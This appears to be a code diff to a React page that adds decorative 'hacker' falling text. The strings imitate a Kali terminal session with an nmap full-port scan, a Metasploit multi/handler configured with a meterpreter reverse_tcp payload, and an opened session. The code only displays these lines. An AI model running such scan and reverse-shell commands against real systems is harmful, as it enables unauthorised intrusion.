@@ -111,9 +111,49 @@ const Index = () => {
     fallingTextContainer.className = "falling-text";
     document.body.appendChild(fallingTextContainer);
 
+    const linuxCommands = [
+      "root@kali:~# nmap -sV -p 1-65535 192.168.1.1",
+      "Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-01 12:00 UTC",
+      "Nmap scan report for 192.168.1.1",
+      "Host is up (0.00023s latency).",
+      "Not shown: 65530 closed ports",
+      "PORT      STATE SERVICE VERSION",
+      "22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+      "80/tcp    open  http    Apache httpd 2.4.38 ((Debian))",
+      "443/tcp   open  ssl/http Apache httpd 2.4.38 ((Debian))",
+      "MAC Address: 00:0C:29:68:8C:7B (VMware, Inc.)",
+      "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
+      "root@kali:~# msfconsole",
+      "[-] ***rting the Metasploit Framework console...",
+      "[-] * WARNING: No database support: No database YAML file",
+      "[-] * WARNING: No database support: No database active",
+      "msf5 > use exploit/multi/handler",
+      "msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp",
+      "payload => windows/meterpreter/reverse_tcp",
+      "msf5 exploit(multi/handler) > set lhost 192.168.1.100",
+      "lhost => 192.168.1.100",
+      "msf5 exploit(multi/handler) > set lport 4444",
+      "lport => 4444",
+      "msf5 exploit(multi/handler) > exploit",
+      "[*] Started reverse TCP handler on 192.168.1.100:4444",
+      "[*] Sending stage (176195 bytes) to 192.168.1.10",
+      "msf5 exploit(multi/handler) > sessions -i 1",
+      "[-] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:12345) at 2023-10-01 12:05:00 UTC",
+      "meterpreter > sysinfo",
+      "Computer        : 192.168.1.10",
+      "OS              : Windows 10 (Build 19041).",
+      "Architecture    : x64",
+      "System Language : en_US",
+      "Domain          : WORKGROUP",
+      "Logged On Users : 1",
+      "Meterpreter     : x64/windows",
+      "meterpreter > exit",
+      "root@kali:~#"
+    ];
+
     const createFallingText = () => {
       const span = document.createElement("span");
-      span.textContent = Math.random().toString(36).substring(2, 15);
+      span.textContent = linuxCommands[Math.floor(Math.random() * linuxCommands.length)];
       span.style.left = `${Math.random() * 100}vw`;
       span.style.animationDuration = `${Math.random() * 5 + 5}s`;
       fallingTextContainer.appendChild(span);
